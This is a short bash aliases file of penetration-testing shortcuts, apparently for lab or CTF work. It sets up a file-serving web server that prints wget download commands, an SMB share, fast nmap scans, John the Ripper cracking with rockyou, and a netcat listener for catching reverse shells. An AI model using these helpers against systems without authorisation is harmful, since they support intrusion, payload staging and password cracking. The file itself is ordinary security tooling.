# append to ~/.bash_rc then run 'source ~/.bash_rc'

# starts python web server on port 80 and prints the wget command to download any file in the current working directory

alias lweb='ip=$(ip a s tun0 | grep -oP "(\d{2}\.){3}\d{1,2}") && for i in $(ls .); do echo "wget $ip/$i"; done; python3 -m http.server 80'

# creates a share named 'smb' serving from the current working directory on the host with username:password test:test
# on the client run 'net use x: \\yourip\smb /u:test test' to connect to the share from cmd.exe, then cd into x: 
# or from powershell run 'new-psdrive -psprovider filesystem -name x -root \\yourip\smb -credential $cred' with $cred a powershell credential block.

alias smbserve='server=$(find / -iname "smbserver.py" 2>/dev/null| tail -1) && python3 $server -smb2support -username test -password test . smb'

# quick nmap full port scan. Usage: qscan 'targetip'

qscan () { nmap -p- --min-rate 5000 --max-retries 2 -n -Pn "$1" }

# run jtr with rockyou. Usage: j 'hash'

j () {john "$1" --wordlist=rockyou.txt}

# start netcat listener to receive reverse shell. Usage: l 'port'

l () {nc -nvlp "$1"}

# run default scripts and nmap version scan against the target ip. Depends on qscan alias above. Usage: fscan 'targetip'

fscan () {nmap -Pn -sCV -p $(qscan "$1" | cut -s -d/ -f1 - | grep -iv nmap | tr '\n' ',' | rev | cut -d, -f2- |rev) "$1"}
